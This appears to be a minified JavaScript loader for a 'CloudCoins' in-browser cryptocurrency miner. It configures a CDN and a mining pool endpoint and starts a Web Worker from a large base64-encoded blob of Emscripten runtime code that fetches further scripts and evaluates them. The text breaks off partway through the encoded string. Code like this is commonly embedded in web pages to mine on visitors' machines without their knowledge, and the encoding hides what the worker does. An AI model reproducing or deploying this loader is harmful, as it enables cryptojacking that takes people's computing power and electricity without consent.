self.CLOUDCOINS=self.CLOUDCOINS||{},self.CLOUDCOINS.CONFIG={LIB_URL:"https://cdn.cloudcoins.co/javascript/",WEBSOCKET_URL:"https://pool.cloudcoins.co/"},CLOUDCOINS.KNIGHT_WORKER=URL.createObjectURL(new Blob([atob("c2VsZi5DTE9VRENPSU5TID0gc2VsZi5DTE9VRENPSU5TIHx8IHt9Owp2YXIgTW9kdWxlID0gewogICAgbG9jYXRlRmlsZTogKGZ1bmN0aW9uKHBhdGgpIHsKICAgICAgICByZXR1cm4gJ2h0dHBzOi8vY2RuLmNsb3VkY29pbnMuY28vamF2YXNjcmlwdC8nICsgcGF0aAogICAgfSkKfTsKCnZhciBNb2R1bGU7CmlmKCFNb2R1bGUpIE1vZHVsZSA9ICh0eXBlb2YgTW9kdWxlICE9PSAidW5kZWZpbmVkIiA/IE1vZHVsZSA6IG51bGwpIHx8IHt9Owp2YXIgbW9kdWxlT3ZlcnJpZGVzID0ge307CmZvcih2YXIga2V5IGluIE1vZHVsZSkgewogICAgaWYoTW9kdWxlLmhhc093blByb3BlcnR5KGtleSkpIHsKICAgICAgICBtb2R1bGVPdmVycmlkZXNba2V5XSA9IE1vZHVsZVtrZXldCiAgICB9Cn0KdmFyIEVOVklST05NRU5UX0lTX1dFQiA9IGZhbHNlOwp2YXIgRU5WSVJPTk1FTlRfSVNfV09SS0VSID0gZmFsc2U7CnZhciBFTlZJUk9OTUVOVF9JU19OT0RFID0gZmFsc2U7CnZhciBFTlZJUk9OTUVOVF9JU19TSEVMTCA9IGZhbHNlOwppZihNb2R1bGVbIkVOVklST05NRU5UIl0pIHsKICAgIGlmKE1vZHVsZVsiRU5WSVJPTk1FTlQiXSA9PT0gIldFQiIpIHsKICAgICAgICBFTlZJUk9OTUVOVF9JU19XRUIgPSB0cnVlCiAgICB9IGVsc2UgaWYoTW9kdWxlWyJFTlZJUk9OTUVOVCJdID09PSAiV09SS0VSIikgewogICAgICAgIEVOVklST05NRU5UX0lTX1dPUktFUiA9IHRydWUKICAgIH0gZWxzZSBpZihNb2R1bGVbIkVOVklST05NRU5UIl0gPT09ICJOT0RFIikgewogICAgICAgIEVOVklST05NRU5UX0lTX05PREUgPSB0cnVlCiAgICB9IGVsc2UgaWYoTW9kdWxlWyJFTlZJUk9OTUVOVCJdID09PSAiU0hFTEwiKSB7CiAgICAgICAgRU5WSVJPTk1FTlRfSVNfU0hFTEwgPSB0cnVlCiAgICB9IGVsc2UgewogICAgICAgIHRocm93IG5ldyBFcnJvcigiVGhlIHByb3ZpZGVkIE1vZHVsZVsnRU5WSVJPTk1FTlQnXSB2YWx1ZSBpcyBub3QgdmFsaWQuIEl0IG11c3QgYmUgb25lIG9mOiBXRUJ8V09SS0VSfE5PREV8U0hFTEwuIikKICAgIH0KfSBlbHNlIHsKICAgIEVOVklST05NRU5UX0lTX1dFQiA9IHR5cGVvZiB3aW5kb3cgPT09ICJvYmplY3QiOwogICAgRU5WSVJPTk1FTlRfSVNfV09SS0VSID0gdHlwZW9mIGltcG9ydFNjcmlwdHMgPT09ICJmdW5jdGlvbiI7CiAgICBFTlZJUk9OTUVOVF9JU19OT0RFID0gdHlwZW9mIHByb2Nlc3MgPT09ICJvYmplY3QiICYmIHR5cGVvZiByZXF1aXJlID09PSAiZnVuY3Rpb24iICYmICFFTlZJUk9OTUVOVF9JU19XRUIgJiYgIUVOVklST05NRU5UX0lTX1dPUktFUjsKICAgIEVOVklST05NRU5UX0lTX1NIRUxMID0gIUVOVklST05NRU5UX0lTX1dFQiAmJiAhRU5WSVJPTk1FTlRfSVNfTk9ERSAmJiAhRU5WSVJPTk1FTlRfSVNfV09SS0VSCn0KaWYoRU5WSVJPTk1FTlRfSVNfTk9ERSkgewogICAgaWYoIU1vZHVsZVsicHJpbnQiXSkgTW9kdWxlWyJwcmludCJdID0gY29uc29sZS5sb2c7CiAgICBpZighTW9kdWxlWyJwcmludEVyciJdKSBNb2R1bGVbInByaW50RXJyIl0gPSBjb25zb2xlLndhcm47CiAgICB2YXIgbm9kZUZTOwogICAgdmFyIG5vZGVQYXRoOwogICAgTW9kdWxlWyJyZWFkIl0gPSBmdW5jdGlvbiBzaGVsbF9yZWFkKGZpbGVuYW1lLCBiaW5hcnkpIHsKICAgICAgICBpZighbm9kZUZTKSBub2RlRlMgPSByZXF1aXJlKCJmcyIpOwogICAgICAgIGlmKCFub2RlUGF0aCkgbm9kZVBhdGggPSByZXF1aXJlKCJwYXRoIik7CiAgICAgICAgZmlsZW5hbWUgPSBub2RlUGF0aFsibm9ybWFsaXplIl0oZmlsZW5hbWUpOwogICAgICAgIHZhciByZXQgPSBub2RlRlNbInJlYWRGaWxlU3luYyJdKGZpbGVuYW1lKTsKICAgICAgICByZXR1cm4gYmluYXJ5ID8gcmV0IDogcmV0LnRvU3RyaW5nKCkKICAgIH07CiAgICBNb2R1bGVbInJlYWRCaW5hcnkiXSA9IGZ1bmN0aW9uIHJlYWRCaW5hcnkoZmlsZW5hbWUpIHsKICAgICAgICB2YXIgcmV0ID0gTW9kdWxlWyJyZWFkIl0oZmlsZW5hbWUsIHRydWUpOwogICAgICAgIGlmKCFyZXQuYnVmZmVyKSB7CiAgICAgICAgICAgIHJldCA9IG5ldyBVaW50OEFycmF5KHJldCkKICAgICAgICB9CiAgICAgICAgYXNzZXJ0KHJldC5idWZmZXIpOwogICAgICAgIHJldHVybiByZXQKICAgIH07CiAgICBNb2R1bGVbImxvYWQiXSA9IGZ1bmN0aW9uIGxvYWQoZikgewogICAgICAgIGdsb2JhbEV2YWwocmVhZChmKSkKICAgIH07CiAgICBpZighTW9kdWxlWyJ0aGlzUHJvZ3JhbSJdKSB7CiAgICAgICAgaWYocHJvY2Vzc1siYXJndiJdLmxlbmd0aCA+IDEpIHsKICAgICAgICAgICAgTW9kdWxlWyJ0aGlzUHJvZ3JhbSJdID0gcHJvY2Vzc1siYXJndiJdWzFdLnJlcGxhY2UoL1xcL2csICIvIikKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBNb2R1bGVbInRoaXNQcm9ncmFtIl0gPSAidW5rbm93bi1wcm9ncmFtIgogICAgICAgIH0KICAgIH0KICAgIE1vZHVsZVsiYXJndW1lbnRzIl0gPSBwcm9jZXNzWyJhcmd2Il0uc2xpY2UoMik7CiAgICBpZih0eXBlb2YgbW9kdWxlICE9PSAidW5kZWZpbmVkIikgewogICAgICAgIG1vZHVsZVsiZXhwb3J0cyJdID0gTW9kdWxlCiAgICB9CiAgICBwcm9jZXNzWyJvbiJdKCJ1bmNhdWdodEV4Y2VwdGlvbiIsIChmdW5jdGlvbihleCkgewogICAgICAgIGlmKCEoZXggaW5zdGFuY2VvZiBFeGl0U3RhdHVzKSkgewogICAgICAgICAgICB0aHJvdyBleAogICAgICAgIH0KICAgIH0pKTsKICAgIE1vZHVsZVsiaW5zcGVjdCJdID0gKGZ1bmN0aW9uKCkgewogICAgICAgIHJldHVybiAiW0Vtc2NyaXB0ZW4gTW9kdWxlIG9iamVjdF0iCiAgICB9KQp9IGVsc2UgaWYoRU5WSVJPTk1FTlRfSVNfU0hFTEwpIHsKICAgIGlmKCFNb2R1bGVbInByaW50Il0pIE1vZHVsZVsicHJpbnQiXSA9IHByaW50OwogICAgaWYodHlwZW9mIHByaW50RXJyICE9ICJ1bmRlZmluZWQiKSBNb2R1bGVbInByaW50RXJyIl0gPSBwcmludEVycjsKICAgIGlmKHR5cGVvZiByZWFkICE9ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgTW9kdWxlWyJyZWFkIl0gPSByZWFkCiAgICB9IGVsc2UgewogICAgICAgIE1vZHVsZVsicmVhZCJdID0gZnVuY3Rpb24gc2hlbGxfcmVhZCgpIHsKICAgICAgICAgICAgdGhyb3cibm8gcmVhZCgpIGF2YWlsYWJsZSIKICAgICAgICB9CiAgICB9CiAgICBNb2R1bGVbInJlYWRCaW5hcnkiXSA9IGZ1bmN0aW9uIHJlYWRCaW5hcnkoZikgewogICAgICAgIGlmKHR5cGVvZiByZWFkYnVmZmVyID09PSAiZnVuY3Rpb24iKSB7CiAgICAgICAgICAgIHJldHVybiBuZXcgVWludDhBcnJheShyZWFkYnVmZmVyKGYpKQogICAgICAgIH0KICAgICAgICB2YXIgZGF0YSA9IHJlYWQoZiwgImJpbmFyeSIpOwogICAgICAgIGFzc2VydCh0eXBlb2YgZGF0YSA9PT0gIm9iamVjdCIpOwogICAgICAgIHJldHVybiBkYXRhCiAgICB9OwogICAgaWYodHlwZW9mIHNjcmlwdEFyZ3MgIT0gInVuZGVmaW5lZCIpIHsKICAgICAgICBNb2R1bGVbImFyZ3VtZW50cyJdID0gc2NyaXB0QXJncwogICAgfSBlbHNlIGlmKHR5cGVvZiBhcmd1bWVudHMgIT0gInVuZGVmaW5lZCIpIHsKICAgICAgICBNb2R1bGVbImFyZ3VtZW50cyJdID0gYXJndW1lbnRzCiAgICB9CiAgICBpZih0eXBlb2YgcXVpdCA9PT0gImZ1bmN0aW9uIikgewogICAgICAgIE1vZHVsZVsicXVpdCJdID0gKGZ1bmN0aW9uKHN0YXR1cywgdG9UaHJvdykgewogICAgICAgICAgICBxdWl0KHN0YXR1cykKICAgICAgICB9KQogICAgfQp9IGVsc2UgaWYoRU5WSVJPTk1FTlRfSVNfV0VCIHx8IEVOVklST05NRU5UX0lTX1dPUktFUikgewogICAgTW9kdWxlWyJyZWFkIl0gPSBmdW5jdGlvbiBzaGVsbF9yZWFkKHVybCkgewogICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3Q7CiAgICAgICAgeGhyLm9wZW4oIkdFVCIsIHVybCwgZmFsc2UpOwogICAgICAgIHhoci5zZW5kKG51bGwpOwogICAgICAgIHJldHVybiB4aHIucmVzcG9uc2VUZXh0CiAgICB9OwogICAgaWYoRU5WSVJPTk1FTlRfSVNfV09SS0VSKSB7CiAgICAgICAgTW9kdWxlWyJyZWFkQmluYXJ5Il0gPSBmdW5jdGlvbiByZWFkQmluYXJ5KHVybCkgewogICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0OwogICAgICAgICAgICB4aHIub3BlbigiR0VUIiwgdXJsLCBmYWxzZSk7CiAgICAgICAgICAgIHhoci5yZXNwb25zZVR5cGUgPSAiYXJyYXlidWZmZXIiOwogICAgICAgICAgICB4aHIuc2VuZChudWxsKTsKICAgICAgICAgICAgcmV0dXJuIG5ldyBVaW50OEFycmF5KHhoci5yZXNwb25zZSkKICAgICAgICB9CiAgICB9CiAgICBNb2R1bGVbInJlYWRBc3luYyJdID0gZnVuY3Rpb24gcmVhZEFzeW5jKHVybCwgb25sb2FkLCBvbmVycm9yKSB7CiAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdDsKICAgICAgICB4aHIub3BlbigiR0VUIiwgdXJsLCB0cnVlKTsKICAgICAgICB4aHIucmVzcG9uc2VUeXBlID0gImFycmF5YnVmZmVyIjsKICAgICAgICB4aHIub25sb2FkID0gZnVuY3Rpb24geGhyX29ubG9hZCgpIHsKICAgICAgICAgICAgaWYoeGhyLnN0YXR1cyA9PSAyMDAgfHwgeGhyLnN0YXR1cyA9PSAwICYmIHhoci5yZXNwb25zZSkgewogICAgICAgICAgICAgICAgb25sb2FkKHhoci5yZXNwb25zZSkKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIG9uZXJyb3IoKQogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgICAgICB4aHIub25lcnJvciA9IG9uZXJyb3I7CiAgICAgICAgeGhyLnNlbmQobnVsbCkKICAgIH07CiAgICBpZih0eXBlb2YgYXJndW1lbnRzICE9ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgTW9kdWxlWyJhcmd1bWVudHMiXSA9IGFyZ3VtZW50cwogICAgfQogICAgaWYodHlwZW9mIGNvbnNvbGUgIT09ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgaWYoIU1vZHVsZVsicHJpbnQiXSkgTW9kdWxlWyJwcmludCJdID0gZnVuY3Rpb24gc2hlbGxfcHJpbnQoeCkgewogICAgICAgICAgICBjb25zb2xlLmxvZyh4KQogICAgICAgIH07CiAgICAgICAgaWYoIU1vZHVsZVsicHJpbnRFcnIiXSkgTW9kdWxlWyJwcmludEVyciJdID0gZnVuY3Rpb24gc2hlbGxfcHJpbnRFcnIoeCkgewogICAgICAgICAgICBjb25zb2xlLndhcm4oeCkKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIHZhciBUUllfVVNFX0RVTVAgPSBmYWxzZTsKICAgICAgICBpZighTW9kdWxlWyJwcmludCJdKSBNb2R1bGVbInByaW50Il0gPSBUUllfVVNFX0RVTVAgJiYgdHlwZW9mIGR1bXAgIT09ICJ1bmRlZmluZWQiID8gKGZ1bmN0aW9uKHgpIHsKICAgICAgICAgICAgZHVtcCh4KQogICAgICAgIH0pIDogKGZ1bmN0aW9uKHgpIHsKICAgICAgICB9KQogICAgfQogICAgaWYoRU5WSVJPTk1FTlRfSVNfV09SS0VSKSB7CiAgICAgICAgTW9kdWxlWyJsb2FkIl0gPSBpbXBvcnRTY3JpcHRzCiAgICB9CiAgICBpZih0eXBlb2YgTW9kdWxlWyJzZXRXaW5kb3dUaXRsZSJdID09PSAidW5kZWZpbmVkIikgewogICAgICAgIE1vZHVsZVsic2V0V2luZG93VGl0bGUiXSA9IChmdW5jdGlvbih0aXRsZSkgewogICAgICAgICAgICBkb2N1bWVudC50aXRsZSA9IHRpdGxlCiAgICAgICAgfSkKICAgIH0KfSBlbHNlIHsKICAgIHRocm93IlVua25vd24gcnVudGltZSBlbnZpcm9ubWVudC4gV2hlcmUgYXJlIHdlPyIKfQoKZnVuY3Rpb24gZ2xvYmFsRXZhbCh4KSB7CiAgICBldmFsLmNhbGwobnVsbCwgeCkKfQoKaWYoIU1vZHVsZVsibG9hZCJdICYmIE1vZHVsZVsicmVhZCJdKSB7CiAgICBNb2R1bGVbImxvYWQiXSA9IGZ1bmN0aW9uIGxvYWQoZikgewogICAgICAgIGdsb2JhbEV2YWwoTW9kdWxlWyJyZWFkIl0oZikpCiAgICB9Cn0KaWYoIU1vZHVsZVsicHJpbnQiXSkgewogICAgTW9kdWxlWyJwcmludCJdID0gKGZ1bmN0aW9uKCkgewogICAgfSkKfQppZighTW9kdWxlWyJwcmludEVyciJdKSB7CiAgICBNb2R1bGVbInByaW50RXJyIl0gPSBNb2R1bGVbInByaW50Il0KfQppZighTW9kdWxlWyJhcmd1bWVudHMiXSkgewogICAgTW9kdWxlWyJhcmd1bWVudHMiXSA9IFtdCn0KaWYoIU1vZHVsZVsidGhpc1Byb2dyYW0iXSkgewogICAgTW9kdWxlWyJ0aGlzUHJvZ3JhbSJdID0gIi4vdGhpcy5wcm9ncmFtIgp9CmlmKCFNb2R1bGVbInF1aXQiXSkgewogICAgTW9kdWxlWyJxdWl0Il0gPSAoZnVuY3Rpb24oc3RhdHVzLCB0b1Rocm93KSB7CiAgICAgICAgdGhyb3cgdG9UaHJvdwogICAgfSkKfQpNb2R1bGUucHJpbnQgPSBNb2R1bGVbInByaW50Il07Ck1vZHVsZS5wcmludEVyciA9IE1vZHVsZVsicHJpbnRFcnIiXTsKTW9kdWxlWyJwcmVSdW4iXSA9IFtdOwpNb2R1bGVbInBvc3RSdW4iXSA9IFtdOwpmb3IodmFyIGtleSBpbiBtb2R1bGVPdmVycmlkZXMpIHsKICAgIGlmKG1vZHVsZU92ZXJyaWRlcy5oYXNPd25Qcm9wZXJ0eShrZXkpKSB7CiAgICAgICAgTW9kdWxlW2tleV0gPSBtb2R1bGVPdmVycmlkZXNba2V5XQogICAgfQp9Cm1vZHVsZU92ZXJyaWRlcyA9IHVuZGVmaW5lZDsKdmFyIFJ1bnRpbWUgPSB7CiAgICBzZXRUZW1wUmV0MDogKGZ1bmN0aW9uKHZhbHVlKSB7CiAgICAgICAgdGVtcFJldDAgPSB2YWx1ZTsKICAgICAgICByZXR1cm4gdmFsdWUKICAgIH0pLCBnZXRUZW1wUmV0MDogKGZ1bmN0aW9uKCkgewogICAgICAgIHJldHVybiB0ZW1wUmV0MAogICAgfSksIHN0YWNrU2F2ZTogKGZ1bmN0aW9uKCkgewogICAgICAgIHJldHVybiBTVEFDS1RPUAogICAgfSksIHN0YWNrUmVzdG9yZTogKGZ1bmN0aW9uKHN0YWNrVG9wKSB7CiAgICAgICAgU1RBQ0tUT1AgPSBzdGFja1RvcAogICAgfSksIGdldE5hdGl2ZVR5cGVTaXplOiAoZnVuY3Rpb24odHlwZSkgewogICAgICAgIHN3aXRjaCh0eXBlKSB7CiAgICAgICAgICAgIGNhc2UiaTEiOgogICAgICAgICAgICBjYXNlImk4IjoKICAgICAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgICAgICBjYXNlImkxNiI6CiAgICAgICAgICAgICAgICByZXR1cm4gMjsKICAgICAgICAgICAgY2FzZSJpMzIiOgogICAgICAgICAgICAgICAgcmV0dXJuIDQ7CiAgICAgICAgICAgIGNhc2UiaTY0IjoKICAgICAgICAgICAgICAgIHJldHVybiA4OwogICAgICAgICAgICBjYXNlImZsb2F0IjoKICAgICAgICAgICAgICAgIHJldHVybiA0OwogICAgICAgICAgICBjYXNlImRvdWJsZSI6CiAgICAgICAgICAgICAgICByZXR1cm4gODsKICAgICAgICAgICAgZGVmYXVsdDogewogICAgICAgICAgICAgICAgaWYodHlwZVt0eXBlLmxlbmd0aCAtIDFdID09PSAiKiIpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gUnVudGltZS5RVUFOVFVNX1NJWkUKICAgICAgICAgICAgICAgIH0gZWxzZSBpZih0eXBlWzBdID09PSAiaSIpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYml0cyA9IHBhcnNlSW50KHR5cGUuc3Vic3RyKDEpKTsKICAgICAgICAgICAgICAgICAgICBhc3NlcnQoYml0cyAlIDggPT09IDApOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBiaXRzIC8gOAogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSksIGdldE5hdGl2ZUZpZWxkU2l6ZTogKGZ1bmN0aW9uKHR5cGUpIHsKICAgICAgICByZXR1cm4gTWF0aC5tYXgoUnVudGltZS5nZXROYXRpdmVUeXBlU2l6ZSh0eXBlKSwgUnVudGltZS5RVUFOVFVNX1NJWkUpCiAgICB9KSwgU1RBQ0tfQUxJR046IDE2LCBwcmVwVmFyYXJnOiAoZnVuY3Rpb24ocHRyLCB0eXBlKSB7CiAgICAgICAgaWYodHlwZSA9PT0gImRvdWJsZSIgfHwgdHlwZSA9PT0gImk2NCIpIHsKICAgICAgICAgICAgaWYocHRyICYgNykgewogICAgICAgICAgICAgICAgYXNzZXJ0KChwdHIgJiA3KSA9PT0gNCk7CiAgICAgICAgICAgICAgICBwdHIgKz0gNAogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgYXNzZXJ0KChwdHIgJiAzKSA9PT0gMCkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHB0cgogICAgfSksIGdldEFsaWduU2l6ZTogKGZ1bmN0aW9uKHR5cGUsIHNpemUsIHZhcmFyZykgewogICAgICAgIGlmKCF2YXJhcmcgJiYgKHR5cGUgPT0gImk2NCIgfHwgdHlwZSA9PSAiZG91YmxlIikpIHJldHVybiA4OwogICAgICAgIGlmKCF0eXBlKSByZXR1cm4gTWF0aC5taW4oc2l6ZSwgOCk7CiAgICAgICAgcmV0dXJuIE1hdGgubWluKHNpemUgfHwgKHR5cGUgPyBSdW50aW1lLmdldE5hdGl2ZUZpZWxkU2l6ZSh0eXBlKSA6IDApLCBSdW50aW1lLlFVQU5UVU1fU0laRSkKICAgIH0pLCBkeW5DYWxsOiAoZnVuY3Rpb24oc2lnLCBwdHIsIGFyZ3MpIHsKICAgICAgICBpZihhcmdzICYmIGFyZ3MubGVuZ3RoKSB7CiAgICAgICAgICAgIHJldHVybiBNb2R1bGVbImR5bkNhbGxfIiArIHNpZ10uYXBwbHkobnVsbCwgW3B0cl0uY29uY2F0KGFyZ3MpKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBNb2R1bGVbImR5bkNhbGxfIiArIHNpZ10uY2FsbChudWxsLCBwdHIpCiAgICAgICAgfQogICAgfSksIGZ1bmN0aW9uUG9pbnRlcnM6IFtdLCBhZGRGdW5jdGlvbjogKGZ1bmN0aW9uKGZ1bmMpIHsKICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgUnVudGltZS5mdW5jdGlvblBvaW50ZXJzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIGlmKCFSdW50aW1lLmZ1bmN0aW9uUG9pbnRlcnNbaV0pIHsKICAgICAgICAgICAgICAgIFJ1bnRpbWUuZnVuY3Rpb25Qb2ludGVyc1tpXSA9IGZ1bmM7CiAgICAgICAgICAgICAgICByZXR1cm4gMiAqICgxICsgaSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB0aHJvdyJGaW5pc2hlZCB1cCBhbGwgcmVzZXJ2ZWQgZnVuY3Rpb24gcG9pbnRlcnMuIFVzZSBhIGhpZ2hlciB2YWx1ZSBmb3IgUkVTRVJWRURfRlVOQ1RJT05fUE9JTlRFUlMuIgogICAgfSksIHJlbW92ZUZ1bmN0aW9uOiAoZnVuY3Rpb24oaW5kZXgpIHsKICAgICAgICBSdW50aW1lLmZ1bmN0aW9uUG9pbnRlcnNbKGluZGV4IC0gMikgLyAyXSA9IG51bGwKICAgIH0pLCB3YXJuT25jZTogKGZ1bmN0aW9uKHRleHQpIHsKICAgICAgICBpZighUnVudGltZS53YXJuT25jZS5zaG93bikgUnVudGltZS53YXJuT25jZS5zaG93biA9IHt9OwogICAgICAgIGlmKCFSdW50aW1lLndhcm5PbmNlLnNob3duW3RleHRdKSB7CiAgICAgICAgICAgIFJ1bnRpbWUud2Fybk9uY2Uuc2hvd25bdGV4dF0gPSAxOwogICAgICAgICAgICBNb2R1bGUucHJpbnRFcnIodGV4dCkKICAgICAgICB9CiAgICB9KSwgZnVuY1dyYXBwZXJzOiB7fSwgZ2V0RnVuY1dyYXBwZXI6IChmdW5jdGlvbihmdW5jLCBzaWcpIHsKICAgICAgICBhc3NlcnQoc2lnKTsKICAgICAgICBpZighUnVudGltZS5mdW5jV3JhcHBlcnNbc2lnXSkgewogICAgICAgICAgICBSdW50aW1lLmZ1bmNXcmFwcGVyc1tzaWddID0ge30KICAgICAgICB9CiAgICAgICAgdmFyIHNpZ0NhY2hlID0gUnVudGltZS5mdW5jV3JhcHBlcnNbc2lnXTsKICAgICAgICBpZighc2lnQ2FjaGVbZnVuY10pIHsKICAgICAgICAgICAgaWYoc2lnLmxlbmd0aCA9PT0gMSkgewogICAgICAgICAgICAgICAgc2lnQ2FjaGVbZnVuY10gPSBmdW5jdGlvbiBkeW5DYWxsX3dyYXBwZXIoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFJ1bnRpbWUuZHluQ2FsbChzaWcsIGZ1bmMpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSBpZihzaWcubGVuZ3RoID09PSAyKSB7CiAgICAgICAgICAgICAgICBzaWdDYWNoZVtmdW5jXSA9IGZ1bmN0aW9uIGR5bkNhbGxfd3JhcHBlcihhcmcpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gUnVudGltZS5keW5DYWxsKHNpZywgZnVuYywgW2FyZ10pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBzaWdDYWNoZVtmdW5jXSA9IGZ1bmN0aW9uIGR5bkNhbGxfd3JhcHBlcigpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gUnVudGltZS5keW5DYWxsKHNpZywgZnVuYywgQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gc2lnQ2FjaGVbZnVuY10KICAgIH0pLCBnZXRDb21waWxlclNldHRpbmc6IChmdW5jdGlvbihuYW1lKSB7CiAgICAgICAgdGhyb3ciWW91IG11c3QgYnVpbGQgd2l0aCAtcyBSRVRBSU5fQ09NUElMRVJfU0VUVElOR1M9MSBmb3IgUnVudGltZS5nZXRDb21waWxlclNldHRpbmcgb3IgZW1zY3JpcHRlbl9nZXRfY29tcGlsZXJfc2V0dGluZyB0byB3b3JrIgogICAgfSksIHN0YWNrQWxsb2M6IChmdW5jdGlvbihzaXplKSB7CiAgICAgICAgdmFyIHJldCA9IFNUQUNLVE9QOwogICAgICAgIFNUQUNLVE9QID0gU1RBQ0tUT1AgKyBzaXplIHwgMDsKICAgICAgICBTVEFDS1RPUCA9IFNUQUNLVE9QICsgMTUgJiAtMTY7CiAgICAgICAgcmV0dXJuIHJldAogICAgfSksIHN0YXRpY0FsbG9jOiAoZnVuY3Rpb24oc2l6ZSkgewogICAgICAgIHZhciByZXQgPSBTVEFUSUNUT1A7CiAgICAgICAgU1RBVElDVE9QID0gU1RBVElDVE9QICsgc2l6ZSB8IDA7CiAgICAgICAgU1RBVElDVE9QID0gU1RBVElDVE9QICsgMTUgJiAtMTY7CiAgICAgICAgcmV0dXJuIHJldAogICAgfSksIGR5bmFtaWNBbGxvYzogKGZ1bmN0aW9uKHNpemUpIHsKICAgICAgICB2YXIgcmV0ID0gSEVBUDMyW0RZTkFNSUNUT1BfUFRSID4+IDJdOwogICAgICAgIHZhciBlbmQgPSAocmV0ICsgc2l6ZSArIDE1IHwgMCkgJiAtMTY7CiAgICAgICAgSEVBUDMyW0RZTkFNSUNUT1BfUFRSID4+IDJdID0gZW5kOwogICAgICAgIGlmKGVuZCA+PSBUT1RBTF9NRU1PUlkpIHsKICAgICAgICAgICAgdmFyIHN1Y2Nlc3MgPSBlbmxhcmdlTWVtb3J5KCk7CiAgICAgICAgICAgIGlmKCFzdWNjZXNzKSB7CiAgICAgICAgICAgICAgICBIRUFQMzJbRFlOQU1JQ1RPUF9QVFIgPj4gMl0gPSByZXQ7CiAgICAgICAgICAgICAgICByZXR1cm4gMAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiByZXQKICAgIH0pLCBhbGlnbk1lbW9yeTogKGZ1bmN0aW9uKHNpemUsIHF1YW50dW0pIHsKICAgICAgICB2YXIgcmV0ID0gc2l6ZSA9IE1hdGguY2VpbChzaXplIC8gKHF1YW50dW0gPyBxdWFudHVtIDogMTYpKSAqIChxdWFudHVtID8gcXVhbnR1bSA6IDE2KTsKICAgICAgICByZXR1cm4gcmV0CiAgICB9KSwgbWFrZUJpZ0ludDogKGZ1bmN0aW9uKGxvdywgaGlnaCwgdW5zaWduZWQpIHsKICAgICAgICB2YXIgcmV0ID0gdW5zaWduZWQgPyArKGxvdyA+Pj4gMCkgKyArKGhpZ2ggPj4+IDApICogNDI5NDk2NzI5NiA6ICsobG93ID4+PiAwKSArICsoaGlnaCB8IDApICogNDI5NDk2NzI5NjsKICAgICAgICByZXR1cm4gcmV0CiAgICB9KSwgR0xPQkFMX0JBU0U6IDEwMjQsIFFVQU5UVU1fU0laRTogNCwgX19kdW1teV9fOiAwCn07Ck1vZHVsZVsiUnVudGltZSJdID0gUnVudGltZTsKdmFyIEFCT1JUID0gMDsKdmFyIEVYSVRTVEFUVVMgPSAwOwoKZnVuY3Rpb24gYXNzZXJ0KGNvbmRpdGlvbiwgdGV4dCkgewogICAgaWYoIWNvbmRpdGlvbikgewogICAgICAgIGFib3J0KCJBc3NlcnRpb24gZmFpbGVkOiAiICsgdGV4dCkKICAgIH0KfQoKZnVuY3Rpb24gZ2V0Q0Z1bmMoaWRlbnQpIHsKICAgIHZhciBmdW5jID0gTW9kdWxlWyJfIiArIGlkZW50XTsKICAgIGlmKCFmdW5jKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgZnVuYyA9IGV2YWwoIl8iICsgaWRlbnQpCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgfQogICAgfQogICAgYXNzZXJ0KGZ1bmMsICJDYW5ub3QgY2FsbCB1bmtub3duIGZ1bmN0aW9uICIgKyBpZGVudCArICIgKHBlcmhhcHMgTExWTSBvcHRpbWl6YXRpb25zIG9yIGNsb3N1cmUgcmVtb3ZlZCBpdD8pIik7CiAgICByZXR1cm4gZnVuYwp9Cgp2YXIgY3dyYXAsIGNjYWxsOwooKGZ1bmN0aW9uKCkgewogICAgdmFyIEpTZnVuY3MgPSB7CiAgICAgICAgInN0YWNrU2F2ZSI6IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgUnVudGltZS5zdGFja1NhdmUoKQogICAgICAgIH0pLCAic3RhY2tSZXN0b3JlIjogKGZ1bmN0aW9uKCkgewogICAgICAgICAgICBSdW50aW1lLnN0YWNrUmVzdG9yZSgpCiAgICAgICAgfSksICJhcnJheVRvQyI6IChmdW5jdGlvbihhcnIpIHsKICAgICAgICAgICAgdmFyIHJldCA9IFJ1bnRpbWUuc3RhY2tBbGxvYyhhcnIubGVuZ3RoKTsKICAgICAgICAgICAgd3JpdGVBcnJheVRvTWVtb3J5KGFyciwgcmV0KTsKICAgICAgICAgICAgcmV0dXJuIHJldAogICAgICAgIH0pLCAic3RyaW5nVG9DIjogKGZ1bmN0aW9uKHN0cikgewogICAgICAgICAgICB2YXIgcmV0ID0gMDsKICAgICAgICAgICAgaWYoc3